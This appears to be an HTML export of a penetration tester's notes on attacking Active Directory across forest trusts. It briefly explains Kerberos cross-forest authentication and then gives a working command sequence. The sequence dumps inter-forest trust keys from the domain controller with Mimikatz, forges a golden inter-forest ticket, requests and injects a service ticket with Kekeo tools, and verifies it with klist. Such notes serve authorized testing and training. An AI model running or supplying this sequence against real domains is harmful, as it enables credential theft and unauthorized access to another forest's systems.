<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Cross-Forest Attacks</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Cross-Forest Attacks</h1></strong><br />At some point you&#39;ll want to attack across Active Directory forests.<br /><br /><strong><h2>## About Cross-Forest Authentication</h2></strong><br /><strong>In Forest A:</strong><br />1. Client requests TGT<br />2. DC sends back TGT<br />3. Client presents TGT, requests a TGS for service in Forest B<br />4. DC send back an inter-domain TGT<br /><br /><strong>From Forest A to Forest B:</strong><br />5. Client requests TGS from Forest B domain controller<br />6. Forest B DC sends back TGS<br />7. Client presents TGS to service in Forest B and accesses service<br /><br /><a href=""><img src="images/475-1.png" alt="images/475-1.png" /></a><br /><br />The point which is abusable is the <code>Request TGS</code> stage.<br /><a href=""><img src="images/475-2.png" alt="images/475-2.png" /></a><br /><br /><br /><strong><h2>## Attack</h2></strong><br /><div class="codebox"><div class="codebox">#&nbsp;1.&nbsp;Access&nbsp;inter-forest&nbsp;trust&nbsp;keys<br />#&nbsp;--------------------------------------------------------------<br />Invoke-Mimikatz&nbsp;-Command&nbsp;&#39;&quot;lsadump::trust&nbsp;/patch&quot;&#39;<br />Invoke-Mimikatz&nbsp;-Command&nbsp;&#39;&quot;lsadump::lsa&nbsp;/patch&quot;&#39;<br /><br />#&nbsp;2.&nbsp;Forge&nbsp;inter-forest&nbsp;TGT<br />#&nbsp;--------------------------------------------------------------<br />Invoke-Mimikatz&nbsp;-Commmand&nbsp;&#39;&quot;Kerberos::golden&nbsp;/user:&lt;user&nbsp;to&nbsp;access&nbsp;forest&nbsp;B&nbsp;as&gt;&nbsp;/domain:&lt;current&nbsp;domain&gt;&nbsp;/sid:&lt;user&nbsp;SID&gt;&nbsp;/rc4:&lt;user&nbsp;hash&gt;&nbsp;/service:krbtgt&nbsp;/target:&lt;forest&nbsp;B&nbsp;trust&nbsp;domain&nbsp;name&gt;&nbsp;/ticket:&lt;path&nbsp;to&nbsp;ticket&nbsp;generated&nbsp;earlier&gt;&quot;&#39;<br /><br />#&nbsp;3.&nbsp;Request&nbsp;TGS&nbsp;by&nbsp;submitting&nbsp;inter-forest&nbsp;TGT<br />#&nbsp;--------------------------------------------------------------<br />#&nbsp;with&nbsp;Kekeo<br />.\asktgs.exe&nbsp;&lt;path&nbsp;to&nbsp;inter-forest&nbsp;TGT&gt;&nbsp;&nbsp;CIFS/forest-b-dc.example.local<br /><br />#&nbsp;4.&nbsp;Inject&nbsp;TGS&nbsp;into&nbsp;LSASS<br />#&nbsp;--------------------------------------------------------------<br />#&nbsp;with&nbsp;Kekeo<br />.\kirbikator.exe&nbsp;lsa&nbsp;&lt;path&nbsp;to&nbsp;to&nbsp;TGS&nbsp;generated&nbsp;above&gt;<br /><br />#&nbsp;5.&nbsp;View&nbsp;ticket<br />#&nbsp;--------------------------------------------------------------<br />klist<br /><br />#&nbsp;TICKET&nbsp;will&nbsp;only&nbsp;be&nbsp;able&nbsp;to&nbsp;access&nbsp;files/things&nbsp;explicitly&nbsp;shared&nbsp;with&nbsp;Forest&nbsp;A<br />#&nbsp;you&nbsp;won&#39;t&nbsp;have&nbsp;Domain&nbsp;Admin&nbsp;in&nbsp;Forest&nbsp;B&nbsp;(unless&nbsp;your&nbsp;user&nbsp;is&nbsp;explicitly&nbsp;set&nbsp;as&nbsp;a&nbsp;Domain&nbsp;Admin&nbsp;in&nbsp;Forest&nbsp;B)</div></div><br /><br /><strong><h3>### Database Links</h3></strong><br />Databases often communicate across forests.<br />This means they&#39;re vulnerable to cross-forest attacks.<br />Refer to <a href="Pentetration_Testing--Extra--Active_Directory_-_Windows_Domains--Privilege_Escalation--MS-SQL_Databases.html">Privilege Escalation &gt; MS-SQL Databases</a><br /><br /></div>
</body>
</html>
